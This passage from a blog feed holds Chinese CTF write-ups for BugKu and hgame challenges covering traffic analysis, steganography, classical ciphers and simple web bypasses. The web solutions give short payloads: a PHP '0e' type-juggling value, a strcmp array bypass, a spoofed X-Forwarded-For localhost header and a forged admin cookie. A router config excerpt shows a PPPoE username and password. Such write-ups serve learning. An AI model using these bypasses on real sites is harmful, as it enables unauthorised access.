title="telnet"></a>telnet</h3><p>这是一个流量分析题，用wireshark打开流量包分析，发现这是一个登陆的过程，flag是password，所以找到输入的password，我们可以得到flag；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Frame 41: 92 bytes on wire (736 bits), 92 bytes captured (736 bits)</span><br><span class="line">Ethernet II, Src: Vmware_84:86:5f (00:0c:29:84:86:5f), Dst: Vmware_26:7e:0e (00:0c:29:26:7e:0e)</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.221.128, Dst: 192.168.221.164</span><br><span class="line">Transmission Control Protocol, Src Port: 1146, Dst Port: 23, Seq: 83, Ack: 124, Len: 38</span><br><span class="line">Telnet</span><br><span class="line">    Data: flag&#123;d316759c281bf925d600be698a4973d5&#125;</span><br></pre></td></tr></table></figure></p><h3 id="眼见非实（ISCCCTF）"><a href="#眼见非实（ISCCCTF）" class="headerlink" title="眼见非实（ISCCCTF）"></a>眼见非实（ISCCCTF）</h3><p>下载下来发现在win下打不来，但是文件名提示是zip，应该是一个压缩包，这里我直接把文件放到kali里面打开，得到一些.xml的文件，一个个看过去，在document.xml里面找到了flag；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">-&lt;w:p w:rsidRDefault=&quot;002B3D8D&quot; w:rsidR=&quot;002B3D8D&quot;&gt;</span><br><span class="line">-&lt;w:r&gt;</span><br><span class="line">&lt;w:t&gt;Flag&lt;/w:t&gt;</span><br><span class="line">&lt;/w:r&gt;</span><br><span class="line">-&lt;w:r&gt;</span><br><span class="line">&lt;w:t&gt;在这里呦！&lt;/w:t&gt;</span><br><span class="line">&lt;/w:r&gt;</span><br><span class="line">&lt;/w:p&gt;</span><br><span class="line">-&lt;w:p w:rsidRDefault=&quot;002B3D8D&quot; w:rsidR=&quot;002B3D8D&quot; w:rsidRPr=&quot;002B3D8D&quot;&gt;</span><br><span class="line">-&lt;w:pPr&gt;</span><br><span class="line">-&lt;w:rPr&gt;</span><br><span class="line">&lt;w:rFonts w:hint=&quot;eastAsia&quot;/&gt;</span><br><span class="line">&lt;w:vanish/&gt;</span><br><span class="line">&lt;/w:rPr&gt;</span><br><span class="line">&lt;/w:pPr&gt;</span><br><span class="line">-&lt;w:r w:rsidRPr=&quot;002B3D8D&quot;&gt;</span><br><span class="line">-&lt;w:rPr&gt;</span><br><span class="line">&lt;w:vanish/&gt;</span><br><span class="line">&lt;/w:rPr&gt;</span><br><span class="line">&lt;w:t&gt;flag&#123;F1@g&#125;&lt;/w:t&gt;</span><br><span class="line">&lt;/w:r&gt;</span><br><span class="line">&lt;w:bookmarkStart w:name=&quot;_GoBack&quot; w:id=&quot;0&quot;/&gt;</span><br><span class="line">&lt;w:bookmarkEnd w:id=&quot;0&quot;/&gt;</span><br><span class="line">&lt;/w:p&gt;</span><br></pre></td></tr></table></figure></p><h3 id="又一张图片，还单纯吗"><a href="#又一张图片，还单纯吗" class="headerlink" title="又一张图片，还单纯吗"></a>又一张图片，还单纯吗</h3><p>下载图片，用binwalk看一下，发现有多个文件，用foremost命令分离出来，发现flag就在分离出来的图片上；</p><h3 id="猜"><a href="#猜" class="headerlink" title="猜"></a>猜</h3><p>有点儿脑洞，题目给了一张只有一半头像的图片，让我们猜这个人的名字，这里我直接用百度图片的搜索功能找出这个人就是刘亦菲，flag get；</p><h3 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h3><p>下载得到一个bin文件，应该是一个配置文件，我们用路由器配置查看器查看bin文件<br>工具下载地址：<a href="http://www.ouyaoxiazai.com/soft/llrj/55/18061.html#dizhi" target="_blank" rel="noopener">http://www.ouyaoxiazai.com/soft/llrj/55/18061.html#dizhi</a><br>打开配置文件可以直接搜索一下username或者password，即可得到flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;WANPPPConnection instance=1 &gt;</span><br><span class="line">        &lt;Enable val=1 /&gt;</span><br><span class="line">        &lt;DefaultGateway val=10.177.144.1 /&gt;</span><br><span class="line">        &lt;Name val=pppoe_eth1_d /&gt;</span><br><span class="line">        &lt;Uptime val=671521 /&gt;</span><br><span class="line">        &lt;Username val=053700357621 /&gt;</span><br><span class="line">        &lt;Password val=210265 /&gt;</span><br><span class="line">        &lt;X_TP_IfName val=ppp0 /&gt;</span><br><span class="line">        &lt;X_TP_L2IfName val=eth1 /&gt;</span><br><span class="line">        &lt;X_TP_ConnectionId val=1 /&gt;</span><br><span class="line">        &lt;ExternalIPAddress val=10.177.150.82 /&gt;</span><br></pre></td></tr></table></figure></p><h3 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h3><p>得到一张图片，用binwalk分析一下，有一个压缩包，分离出来后图片上提示压缩包密码3位数，所以直接暴力破解，密码是871，解压后是一张3.jpg的图片，用winhex打开，在末尾看到一串字符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f1@g&#123;eTB1IEFyZSBhIGhAY2tlciE=&#125;</span><br></pre></td></tr></table></figure></p><p>直接提交发现不对，然后对flag里面的字符串进行base64解码，得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\x79 \x30 \x75 \x20 \x41 \x72 \x65 \x20 </span><br><span class="line">\x61 \x20 \x68 \x40 \x63 \x6b \x65 \x72 </span><br><span class="line">\x21</span><br></pre></td></tr></table></figure></p><p>接着我们将其转换成ASCII，在线转换地址：<a href="http://www.ab126.com/goju/1711.html" target="_blank" rel="noopener">http://www.ab126.com/goju/1711.html</a>,可以得到flag；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\y \0 \u \  \A \r \e \  </span><br><span class="line">\a \  \h \@ \c \k \e \r </span><br><span class="line">\!</span><br></pre></td></tr></table></figure><p>这里提交的时候要把前面的f1@g改成flag，我也是试了几次才对的。</p><h3 id="多种方法解决"><a href="#多种方法解决" class="headerlink" title="多种方法解决"></a>多种方法解决</h3><p>下载得到一个exe文件，无法运行，妖魔化winhex打开发现是一串base64编码，这里用base64转图片<br>地址：<a href="http://tool.chinaz.com/tools/imgtobase" target="_blank" rel="noopener">http://tool.chinaz.com/tools/imgtobase</a>可以得到一张二维码，直接扫一扫可以得到flag；</p><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><h3 id="这么多数据包"><a href="#这么多数据包" class="headerlink" title="这么多数据包"></a>这么多数据包</h3><h3 id="隐写3"><a href="#隐写3" class="headerlink" title="隐写3"></a>隐写3</h3><p>下载得到一张图片，发现宽和高不太协调，想到png像素隐藏，参考余老师的一篇文章<br><a href="http://blog.csdn.net/saltyfish_yuch/article/details/78429431" target="_blank" rel="noopener">png像素隐写</a><br>用winhex改一下像素值就可以得到flag。</p><h3 id="细心地大象"><a href="#细心地大象" class="headerlink" title="细心地大象"></a>细心地大象</h3><p>先用binwalk分离出加密压缩包，查看图片属性发现一串字符串在备注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TVNEUzQ1NkFTRDEyM3p6</span><br></pre></td></tr></table></figure></p><p>试了一下密码不对，又base64解码了一下，发现可以解开压缩包，得到另一张图片，这张图片就是用了之前的png像素隐藏，所以修改一下像素就可以得到flag。</p><p>### </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BugKu新赛季&quot;&gt;&lt;a href=&quot;#BugKu新赛季&quot; class=&quot;headerlink&quot; title=&quot;BugKu新赛季&quot;&gt;&lt;/a&gt;BugKu新赛季&lt;/h1&gt;&lt;p&gt;题目地址：&lt;a href=&quot;http://ctf.bugku.com/challenges&quot;
      
    
    </summary>
    
    
      <category term="-ctf" scheme="http://ju5tw4nty0u.top/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>hgame（week_1）-----未完待续</title>
    <link href="http://ju5tw4nty0u.top/2018/02/06/hgame%EF%BC%88weekek-1%EF%BC%89-%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD/"/>
    <id>http://ju5tw4nty0u.top/2018/02/06/hgame（weekek-1）-未完待续/</id>
    <published>2018-02-06T12:28:59.000Z</published>
    <updated>2018-02-08T13:35:33.153Z</updated>
    
    <content type="html"><![CDATA[<pre><code>又是一个划水的比赛，又控制不住自己的双手，还是去水了几题，写点东西记录一下吧！！！</code></pre><h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="Are-you-from-Europe"><a href="#Are-you-from-Europe" class="headerlink" title="Are you from Europe?"></a>Are you from Europe?</h3><p><img src="https://t1.picb.cc/uploads/2018/02/06/s3BsR.png" alt="web1"></p><p>打开题目地址，是一个抽奖页面，f12看一下源码</p><p><img src="https://t1.picb.cc/uploads/2018/02/06/s3RWg.png" alt="getcard函数"></p><p>发现有一个getcard的函数，并且SSR的概率极低（0.0000001），我们可以通过重写函数把SSR的概率改为1，通过控制台写入，然后进行抽奖，得到flag：hgame{Th3_Ch0seN_0nE!}</p><h3 id="special-number"><a href="#special-number" class="headerlink" title="special number"></a>special number</h3><p><img src="https://t1.picb.cc/uploads/2018/02/06/s3xRX.png" alt="https://t1.picb.cc/uploads/2018/02/06/s3xRX.png"><br>题目提示PHP弱类型</p><p>这里参考了<a href="http://www.freebuf.com/articles/web/129607.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/129607.html</a>这篇文章</p><p>然后分析源码<br><img src="https://t1.picb.cc/uploads/2018/02/06/s39kG.png" alt="https://t1.picb.cc/uploads/2018/02/06/s39kG.png"></p><p>我们还需要绕过正则表达式，</p><p>构造payload:<a href="http://118.25.18.223:10001/?key=0e000000000000000000000来获取flag（0e" target="_blank" rel="noopener">http://118.25.18.223:10001/?key=0e000000000000000000000来获取flag（0e</a> 纯数字这种格式的字符串在判断相等的时候会被认为是科学计数法的数字，先做字符串到数字的转换）</p><p>提交后即可得到flag：hgame{pHp_w34k_typing_s000_e4sy}。</p><h3 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h3><p><img src="https://t1.picb.cc/uploads/2018/02/06/s3U0j.png" alt="https://t1.picb.cc/uploads/2018/02/06/s3U0j.png"></p><p>打开题目地址提示only robot know where is the flag ，我们可以想到robots.txt文件</p><p>访问robots.txt可以看到一个/f1aaaaaaaag.php的页面</p><p>访问该页面提示only admin can get flag</p><p>通过burp抓包改一下user=admin即可得到flag。</p><h3 id="tell-me-what-you-want"><a href="#tell-me-what-you-want" class="headerlink" title="tell me what you want"></a>tell me what you want</h3><p><img src="https://t1.picb.cc/uploads/2018/02/06/s3oW7.png" alt="https://t1.picb.cc/uploads/2018/02/06/s3oW7.png"><br>根据题目提示提交?want=flag,提示“request method is error.I think POST is better”</p><p>改用POST提交，提示“only localhost can get flag”</p><p>需要构造X-Forwarded-For: 127.0.0.1来实现本地访问</p><p>通过burp修改请求头可以得到flag：hgame{For9e_hTTp_iS_N0T_HArd}</p><h3 id="我们不一样"><a href="#我们不一样" class="headerlink" title="我们不一样"></a>我们不一样</h3><p><img src="https://t1.picb.cc/uploads/2018/02/06/sNyx6.png" alt="https://t1.picb.cc/uploads/2018/02/06/sNyx6.png"><br>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&apos;str1&apos;])&amp;&amp;isset($_POST[&apos;str2&apos;]))&#123;</span><br><span class="line">    if ($_POST[&apos;str1&apos;]!=$_POST[&apos;str2&apos;]&amp;&amp;strcmp($_POST[&apos;str1&apos;],$_POST[&apos;str2&apos;])==0) &#123;</span><br><span class="line">        echo &quot;flag is:&quot;.$flag;</span><br><span class="line">        exit();</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        echo &quot;Something wrong..&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目提示PHP弱类型，参考<a href="http://www.freebuf.com/articles/web/129607.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/129607.html</a>，</p><p>我们的payload：str1=123 &amp; str2[]= </p><p>POST提交后可得到flag:flag is:hgame{g3t_f14g_is_so0000_ez}</p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h3 id="re0"><a href="#re0" class="headerlink" title="re0"></a>re0</h3><p><img src="https://t1.picb.cc/uploads/2018/02/06/sNVrM.png" alt="https://t1.picb.cc/uploads/2018/02/06/sNVrM.png"></p><p>下载得到一个re0.exe,用OD打开，查找所有参考文本字符串，即可得到flag。</p><h3 id="baby-crack"><a href="#baby-crack" class="headerlink" title="baby_crack"></a>baby_crack</h3><p>没做出来QAQ</p><h3 id="nop-pop"><a href="#nop-pop" class="headerlink" title="nop_pop"></a>nop_pop</h3><p>没做出来+1QAQ</p><h3 id="sc2-player"><a href="#sc2-player" class="headerlink" title="sc2_player"></a>sc2_player</h3><p>同样没做出来QWQ</p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><p>对萌新来说太难了，准备花时间好好学学pwn，以pwn签到题为目标。</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h3 id="白菜1"><a href="#白菜1" class="headerlink" title="白菜1"></a>白菜1</h3><p><img src="https://t1.picb.cc/uploads/2018/02/06/sNgSt.png" alt="https://t1.picb.cc/uploads/2018/02/06/sNgSt.png"></p><p>拿到flag.png,先到binwalk跑一下，发现有一个zlib文件，emmmm然后卡住了，感觉这条路走不通</p><p>又试了一下LSB隐写，发现RGB的0通道里面与一个flag.txt,提取出相应的数据，用binwalk分离得到flag.txt,打开即可得到flag。</p><h3 id="白菜2"><a href="#白菜2" class="headerlink" title="白菜2"></a>白菜2</h3><p><img src="https://t1.picb.cc/uploads/2018/02/06/sNZcr.png" alt="https://t1.picb.cc/uploads/2018/02/06/sNZcr.png"></p><p>拿到一张misc.jpg,binwalk看一下，发现有一个zip压缩包，分离出来解压缩即可得到flag。</p><h3 id="pacp1"><a href="#pacp1" class="headerlink" title="pacp1"></a>pacp1</h3><p><img src="https://t1.picb.cc/uploads/2018/02/06/sNCSv.png" alt="https://t1.picb.cc/uploads/2018/02/06/sNCSv.png"></p><p>典型的流量分析，用wireshark打开，筛选HTTP流量，发现第557个包有一个访问flag.php的请求，第559个包回复相关信息，查看详细字段即可得到flag。</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h3 id="easy-Caesar"><a href="#easy-Caesar" class="headerlink" title="easy Caesar"></a>easy Caesar</h3><p><img src="https://t1.picb.cc/uploads/2018/02/06/sNmyi.png" alt="https://t1.picb.cc/uploads/2018/02/06/sNmyi.png"></p><p>这题卡了很久，对密文进行凯撒解密发现有一个hgame开头的结果，应该就是我们要的flag，但是提交不上去，后面百度了一下这句话，发现语义为“The quick brown fox jumps over a lazy dog”，结合我们解出来的“The_qu8ck_br7wn_1x_jUmps_ovEr_a_La9y_dOg”，一下子没了思路，后面才知道是数字也要类似凯撒密码进行移位，n=3，即可得到flag。</p><h3 id="Polybius"><a href="#Polybius" class="headerlink" title="Polybius"></a>Polybius</h3><p><img src="https://t1.picb.cc/uploads/2018/02/06/sNvQK.png" alt="https://t1.picb.cc/uploads/2018/02/06/sNvQK.png"></p><p>又是一个没见过的英语单词，放上去百度一下，发现是“波利比奥斯方阵密码”，非常高兴。但是方阵密码是用1-5的数字表示字母密文的。猜想一下，应该是有变形，查找一下，果然是这样。变形的密码用A、D、F、G、X五个字母表示，跟题目给出的内容吻合，完美！<br><img src="https://i.loli.net/2018/02/07/5a79d5adb0e34.png" alt="fz.png"></p><p>两位字母表示一个密文，如AF=a，字母j和i视为同一个字母。得出<br>hgame{fritz_nebel_invented_it}</p><h3 id="Hill"><a href="#Hill" class="headerlink" title="Hill"></a>Hill</h3><p><img src="https://t1.picb.cc/uploads/2018/02/06/sN7yj.png" alt="https://t1.picb.cc/uploads/2018/02/06/sN7yj.png"></p><p>老办法，百度一下，发现的希尔密码，秘钥是9 17 6 5，后面的字母是密文。这里有一个在线解密网站：<br><a href="http://www.practicalcryptography.com/ciphers/hill-cipher/" target="_blank" rel="noopener">http://www.practicalcryptography.com/ciphers/hill-cipher/</a><br>跑一下得到flag:hgame{overthehillx}。</p><h3 id="confusion"><a href="#confusion" class="headerlink" title="confusion"></a>confusion</h3><p><img src="https://t1.picb.cc/uploads/2018/02/06/sN3DN.png" alt="https://t1.picb.cc/uploads/2018/02/06/sN3DN.png"></p><p>摩斯密码：MRLTK6KXNVZXQWBSNA2FSU2GGBSW45BSLAZFU6SVJBNDAZSRHU6Q====</p><p>Base32:dW5yWmsxX2h4YSF0ent2X2ZzUHZ0fQ==</p><p>Base64 : unrZk1_hxa!tz{v_fsPvt}</p><p>栅栏: n=2 unrZk1_hxa!tz{v_fsPvt}</p><p>凯撒: hgame{Mix_1s_fuCking!}</p><h3 id="baby-step"><a href="#baby-step" class="headerlink" title="baby step"></a>baby step</h3><p>没解出来QAQ</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;又是一个划水的比赛，又控制不住自己的双手，还是去水了几题，写点东西记录一下吧！！！
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;week1&quot;&gt;&lt;a href=&quot;#week1&quot; class=&quot;headerlink&quot; title=&quot;week1&quot;&gt;&lt;/a&gt;week1
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ju5tw4nty0u.top/tags/CTF/"/>
    
      <category term="WP" scheme="http://ju5tw4nty0u.top/tags/WP/"/>
    
  </entry>
  
</feed>
